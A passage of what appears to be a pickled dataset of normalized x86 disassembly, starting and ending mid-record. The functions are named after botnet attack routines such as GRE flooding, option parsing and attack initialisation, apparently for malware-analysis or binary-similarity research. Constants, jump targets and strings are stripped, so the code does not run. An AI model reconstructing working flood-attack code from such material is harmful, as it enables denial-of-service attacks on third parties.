EAX\nXOR~EAX,EAX\nMOV~AL,[ESP+0]\nPUSH~EAX\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJZ~FOO\nXOR~EAX,EAX\nMOV~AL,[ESP+0]\nTEST~EAX,EAX\nJLE~FOO\nMOV~EBX,0\nLEA~ESI,[EAX+0]\nLEA~ESI,[ESI+0]\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX+EBX*8-0]\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EBX\nCMP~EBX,ESI\nJNZ~FOO\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],EBX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nJMP~FOO\nXOR~EDX,EDX\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nMOV~DL,[ESP+0]\nMOV~[ESP+0],EDX\nPUSH~EDX\nCALL~FOO\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EBX\nADD~ESP,0\nTEST~EBX,EBX\nJLE~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~ESI,[ESP+0]\nMOV~AL,[EDI+0]\nMOV~[ESI+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~AL,[EDI+0]\nXOR~EBX,EBX\nMOV~ESI,[ESP+0]\nMOV~BL,AL\nSUB~ESI,0\nMOV~[ESP+0],AL\nCMP~ESI,EBX\nJL~FOO\nMOV~EDX,[ESP+0]\nADD~EDI,0\nMOV~[ESP+0],EDX\nMOV~[ESP+0],0\nJMP~FOO\nMOV~ECX,ESI\nSUB~ECX,EBX\nJZ~FOO\nXOR~EAX,EAX\nMOV~EBX,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nCMP~ECX,0\nLEA~EBX,[ESI+EBX*8]\nLEA~EDX,[EAX+EDI]\nMOV~[ESP+0],EBX\nMOV~EBX,[ESP+0]\nMOV~AL,[EDX]\nMOV~[ESI+EBX*8+0],AL\nJZ~FOO\nMOV~AL,[EDX+0]\nXOR~EBX,EBX\nLEA~ESI,[ECX-0]\nMOV~BL,AL\nMOV~[ESP+0],AL\nCMP~ESI,EBX\nJL~FOO\nLEA~EDI,[EDX+0]\nPUSH~EAX\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nADD~ESP,0\nMOV~[EDX],EAX\nPUSH~EBX\nPUSH~EDI\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~[ESP+0],EAX\nJNZ~FOO\nJMP~FOO"'
p23
L651L
tp24
a(S'attack_kill_all'
p25
S'"SUB~ESP,0\nMOV~EAX,<STR>\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EAX,<STR>\nMOV~<STR>,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EAX,<STR>\nMOV~<STR>,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EAX,<STR>\nMOV~<STR>,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EAX,<STR>\nMOV~<STR>,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EAX,<STR>\nMOV~<STR>,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EAX,<STR>\nMOV~<STR>,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EAX,<STR>\nMOV~<STR>,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~<STR>,0\nADD~ESP,0\nJMP~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO"'
p26
L328L
tp27
a(S'attack_get_opt_ip'
p28
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~DL,[ESP+0]\nMOV~EBX,[ESP+0]\nAND~EDX,0\nMOV~EDI,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~ESI,EDX\nTEST~EDX,EDX\nJZ~FOO\nMOV~[ESP+0],AL\nCMP~AL,[EBX+0]\nJZ~FOO\nLEA~EDX,[EBX+0]\nXOR~ECX,ECX\nJMP~FOO\nMOV~AL,[EDX+0]\nMOV~EBX,EDX\nADD~EDX,0\nCMP~[ESP+0],AL\nJZ~FOO\nINC~ECX\nCMP~ESI,ECX\nJNZ~FOO\nMOV~EAX,EDI\nPOP~EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN\nMOV~EAX,[EBX]\nTEST~EAX,EAX\nJZ~FOO\nMOV~[ESP+0],EAX\nPOP~ESI\nPOP~EBX\nPOP~ESI\nPOP~EDI\nJMP~FOO"'
p29
L95L
tp30
a(S'attack_get_opt_int'
p31
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~DL,[ESP+0]\nMOV~EBX,[ESP+0]\nAND~EDX,0\nMOV~EDI,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~ESI,EDX\nTEST~EDX,EDX\nJZ~FOO\nMOV~[ESP+0],AL\nCMP~AL,[EBX+0]\nJZ~FOO\nLEA~EDX,[EBX+0]\nXOR~ECX,ECX\nJMP~FOO\nMOV~AL,[EDX+0]\nMOV~EBX,EDX\nADD~EDX,0\nCMP~[ESP+0],AL\nJZ~FOO\nINC~ECX\nCMP~ESI,ECX\nJNZ~FOO\nMOV~EAX,EDI\nPOP~EDI\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN\nMOV~EAX,[EBX]\nTEST~EAX,EAX\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],EAX\nPOP~EAX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nJMP~FOO"'
p32
L103L
tp33
a(S'attack_init'
p34
S'"PUSH~EBX\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[EAX+0],0\nMOV~DWORDPTR[EAX],0\nPOP~EAX\nXOR~EAX,EAX\nMOV~AL,<STR>\nPOP~EDX\nLEA~EAX,<STR>\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~DL,<STR>\nXOR~ECX,ECX\nMOV~CL,DL\nINC~EDX\nMOV~<STR>,EAX\nMOV~[EAX+ECX*4],EBX\nMOV~<STR>,DL\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[EAX+0],0\nMOV~DWORDPTR[EAX],0\nPOP~EAX\nXOR~EAX,EAX\nMOV~AL,<STR>\nPOP~EDX\nLEA~EAX,<STR>\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~DL,<STR>\nXOR~ECX,ECX\nMOV~CL,DL\nINC~EDX\nMOV~<STR>,EAX\nMOV~[EAX+ECX*4],EBX\nMOV~<STR>,DL\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[EAX+0],0\nMOV~DWORDPTR[EAX],0\nPOP~EAX\nXOR~EAX,EAX\nMOV~AL,<STR>\nPOP~EDX\nLEA~EAX,<STR>\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~DL,<STR>\nXOR~ECX,ECX\nMOV~CL,DL\nINC~EDX\nMOV~<STR>,EAX\nMOV~[EAX+ECX*4],EBX\nMOV~<STR>,DL\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[EAX+0],0\nMOV~DWORDPTR[EAX],0\nPOP~EAX\nXOR~EAX,EAX\nMOV~AL,<STR>\nPOP~EDX\nLEA~EAX,<STR>\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~DL,<STR>\nXOR~ECX,ECX\nMOV~CL,DL\nINC~EDX\nMOV~<STR>,EAX\nMOV~[EAX+ECX*4],EBX\nMOV~<STR>,DL\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[EAX+0],0\nMOV~DWORDPTR[EAX],0\nPOP~EAX\nXOR~EAX,EAX\nMOV~AL,<STR>\nPOP~EDX\nLEA~EAX,<STR>\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~DL,<STR>\nXOR~ECX,ECX\nMOV~CL,DL\nINC~EDX\nMOV~<STR>,EAX\nMOV~[EAX+ECX*4],EBX\nMOV~<STR>,DL\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[EAX+0],0\nMOV~DWORDPTR[EAX],0\nPOP~EAX\nXOR~EAX,EAX\nMOV~AL,<STR>\nPOP~EDX\nLEA~EAX,<STR>\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~DL,<STR>\nXOR~ECX,ECX\nMOV~CL,DL\nINC~EDX\nMOV~<STR>,EAX\nMOV~[EAX+ECX*4],EBX\nMOV~<STR>,DL\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[EAX+0],0\nMOV~DWORDPTR[EAX],0\nPOP~EAX\nXOR~EAX,EAX\nMOV~AL,<STR>\nPOP~EDX\nLEA~EAX,<STR>\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~DL,<STR>\nXOR~ECX,ECX\nMOV~CL,DL\nINC~EDX\nMOV~<STR>,EAX\nMOV~[EAX+ECX*4],EBX\nMOV~<STR>,DL\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[EAX+0],0\nMOV~DWORDPTR[EAX],0\nPOP~EAX\nXOR~EAX,EAX\nMOV~AL,<STR>\nPOP~EDX\nLEA~EAX,<STR>\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~DL,<STR>\nXOR~ECX,ECX\nMOV~CL,DL\nINC~EDX\nMOV~<STR>,EAX\nMOV~[EAX+ECX*4],EBX\nMOV~<STR>,DL\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[EAX+0],0\nMOV~DWORDPTR[EAX],0\nPOP~EAX\nXOR~EAX,EAX\nMOV~AL,<STR>\nPOP~EDX\nLEA~EAX,<STR>\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~DL,<STR>\nXOR~ECX,ECX\nMOV~CL,DL\nINC~EDX\nMOV~<STR>,EAX\nMOV~[EAX+ECX*4],EBX\nMOV~<STR>,DL\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[EAX+0],0\nMOV~DWORDPTR[EAX],0\nPOP~EAX\nXOR~EAX,EAX\nMOV~AL,<STR>\nPOP~EDX\nLEA~EAX,<STR>\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~DL,<STR>\nXOR~ECX,ECX\nMOV~CL,DL\nINC~EDX\nMOV~<STR>,EAX\nMOV~[EAX+ECX*4],EBX\nMOV~<STR>,DL\nMOV~EAX,0\nADD~ESP,0\nPOP~EBX\nRETN"'
p35
L772L
tp36
a(S'attack_gre_eth'
p37
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~EAX,EAX\nMOV~EDI,[ESP+0]\nMOVZX~ESI,[ESP+0]\nPUSH~0\nAND~ESI,0\nMOV~AL,[ESP+0]\nMOV~[ESP+0],EAX\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nMOV~EAX,<STR>\nPUSH~EAX\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~EAX,[ESP+0]\nMOV~EDX,EBP\nMOV~EDI,[ESP+0]\nMOV~[ESP+0],CX\nMOV~[ESP+0],AX\nMOV~[ESP+0],DL\nMOV~[ESP+0],0\nTEST~EDI,EDI\nJLE~FOO\nMOV~EAX,[ESP+0]\nXOR~EBX,EBX\nLEA~ECX,[EAX+0]\nLEA~EDX,[EAX+0]\nMOV~[ESP+0],CX\nMOV~ECX,[ESP+0]\nXOR~ECX,0\nLEA~EBP,[EAX+0]\nMOV~[ESP+0],DX\nMOV~[ESP+0],CX\nJMP~FOO\nMOV~EAX,[EBX+0]\nMOV~[ESI+0],EAX\nMOV~EBX,[ESP+0]\nMOV~EAX,[ESP+0]\nINC~EBX\nROR~AX,0\nMOV~[ESP+0],EBX\nMOV~[EDI],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EDI+0],AX\nMOV~EAX,EBP\nROR~AX,0\nCMP~[ESP+0],EBX\nMOV~[EDI+0],AX\nJLE~FOO\nPUSH~ESI\nPUSH~ESI\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EBX,[EDX+EAX*4]\nLEA~EAX,[EBX+0]\nLEA~ECX,[EBX+0]\nMOV~[ESP+0],EAX\nMOV~BYTEPTR[EBX],0\nMOV~DL,[ESP+0]\nLEA~ESI,[EBX+0]\nMOV~[EBX+0],DL\nLEA~EDI,[EBX+0]\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EBX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[ECX+0],0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[EBX+0],EDX\nMOV~EDX,[ESP+0]\nMOV~EAX,[ESP+0]\nMOV~[ECX+0],0\nLEA~EAX,[EAX+EAX*2]\nMOV~EAX,[EDX+EAX*8+0]\nMOV~[EBX+0],0\nMOV~[EBX+0],EAX\nMOV~AL,[ESP+0]\nMOV~[ESI+0],AL\nMOV~DL,[ESP+0]\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~AX,[ESP+0]\nMOV~[ESI+0],DL\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJZ~FOO\nMOV~[ESI+0],0\nMOV~[ESI+0],0\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nSUB~EAX,0\nXOR~EAX,0\nMOV~[ESI+0],EAX\nJMP~FOO\nSUB~ESP,0\nMOV~EBP,[ESP+0]\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nADD~EDX,0\nADD~ECX,0\nMOV~[ESP+0],EDX\nMOV~[ESP+0],ECX\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJLE~FOO\nMOV~[ESP+0],0\nXOR~EAX,EAX\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nLEA~EBP,[ESI+0]\nLEA~EDI,[ESI+0]\nLEA~EBX,[ESI+0]\nCMP~[EAX+0],0\nJBE~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EAX,[ESI+0]\nMOV~[EDI+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~EAX\nPUSH~0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[EBP+0]\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[EBP+0]\nLEA~ECX,[ESP+0]\nPUSH~ECX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJNZ~FOO\nMOV~[ESI+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nPOP~EBP\nPOP~EAX\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~[EDI+0],AX\nMOV~[EBX+0],0\nPUSH~ECX\nMOV~AX,[EBX+0]\nAND~EAX,0\nPUSH~EAX\nPUSH~EBX\nPUSH~EDI\nCALL~FOO\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nADD~ESP,0\nSHL~EAX,0\nMOV~WORDPTR[EAX+EDX],0\nMOV~EDX,[ESI+0]\nMOV~[EAX+ECX+0],EDX\nMOV~[EAX+ECX+0],0\nADD~EAX,ECX\nPUSH~0\nPUSH~EAX\nPUSH~0\nMOV~EDX,[ESP+0]\nPUSH~EDX\nPUSH~ESI\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,[ESP+0]\nJGE~FOO\nJMP~FOO\nMOV~EAX,[EAX+0]\nMOV~[ESP+0],EAX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nLEA~ECX,[EDX+EDX*2]\nMOV~EDX,[ESP+0]\nMOV~CL,[EDX+ECX*8+0]\nMOV~EDX,[ESP+0]\nAND~ECX,0\nSHR~EAX,CL\nADD~EAX,EDX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nSUB~EAX,0\nXOR~EAX,0\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[EBX+0],AX\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],EAX\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,[ESP+0]\nADD~ECX,0\nADD~EAX,0\nMOV~[ESP+0],ECX\nMOV~[ESP+0],EAX\nJMP~FOO"'
p38
L1379L
tp39
a(S'attack_gre_ip'
p40
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~EAX,EAX\nMOV~EBX,[ESP+0]\nMOVZX~ESI,[ESP+0]\nPUSH~0\nAND~ESI,0\nMOV~AL,[ESP+0]\nMOV~[ESP+0],EAX\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nPUSH~0\nMOV~EBP,EAX\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,<STR>\nMOV~EDI,EAX\nPUSH~EDX\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EAX,EDI\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],AL\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~[ESP+0],CX\nMOV~[ESP+0],BP\nMOV~[ESP+0],0\nTEST~EAX,EAX\nJLE~FOO\nMOV~EAX,[ESP+0]\nXOR~EBX,EBX\nLEA~EDX,[EAX+0]\nLEA~ECX,[EAX+0]\nMOV~[ESP+0],DX\nMOV~EDX,[ESP+0]\nXOR~EDX,0\nLEA~EBP,[EAX+0]\nMOV~[ESP+0],CX\nMOV~[ESP+0],DX\nJMP~FOO\nMOV~EAX,[EBX+0]\nMOV~[ESI+0],EAX\nMOV~EBX,[ESP+0]\nMOV~EAX,[ESP+0]\nINC~EBX\nROR~AX,0\nMOV~[ESP+0],EBX\nMOV~[EDI],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EDI+0],AX\nMOV~EAX,EBP\nROR~AX,0\nCMP~[ESP+0],EBX\nMOV~[EDI+0],AX\nJLE~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~[ECX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EBX,[ECX+EAX*4]\nMOV~BYTEPTR[EBX],0\nLEA~EDX,[EBX+0]\nMOV~AL,[ESP+0]\nLEA~ESI,[EBX+0]\nMOV~[EBX+0],AL\nLEA~EDI,[EBX+0]\nMOV~AX,[ESP+0]\nMOV~CL,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nADD~ESP,0\nMOV~[EBX+0],CL\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[EBX+0],AX\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EDX+0],0\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~EAX,[ECX+EAX*8+0]\nMOV~[EBX+0],0\nMOV~[EBX+0],EAX\nMOV~AL,[ESP+0]\nMOV~[ESI+0],AL\nMOV~DL,[ESP+0]\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~AX,[ESP+0]\nMOV~[ESI+0],DL\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJZ~FOO\nMOV~[ESI+0],0\nMOV~[ESI+0],0\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nSUB~EAX,0\nXOR~EAX,0\nMOV~[ESI+0],EAX\nJMP~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nADD~EDX,0\nADD~ECX,0\nMOV~[ESP+0],EDX\nMOV~[ESP+0],ECX\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nLEA~ESI,[ESI+0]\nJLE~FOO\nMOV~[ESP+0],0\nXOR~EAX,EAX\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nLEA~EDI,[ESI+0]\nLEA~EBP,[ESI+0]\nCMP~[EAX+0],0\nJBE~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EAX,[ESI+0]\nMOV~[EDI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nMOV~[ESI+0],0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~EAX,[ESP+0]\nMOV~[EBP+0],0\nPUSH~EAX\nMOV~AX,[EBP+0]\nAND~EAX,0\nPUSH~EAX\nPUSH~EBP\nPUSH~EDI\nCALL~FOO\nMOV~[EBP+0],AX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESI+0]\nLEA~EAX,[EAX+EAX*2]\nADD~ESP,0\nSHL~EAX,0\nMOV~WORDPTR[EAX+ECX],0\nMOV~[EAX+ECX+0],EDX\nMOV~[EAX+ECX+0],0\nADD~EAX,ECX\nPUSH~0\nPUSH~EAX\nPUSH~0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nMOV~EAX,[ESP+0]\nPUS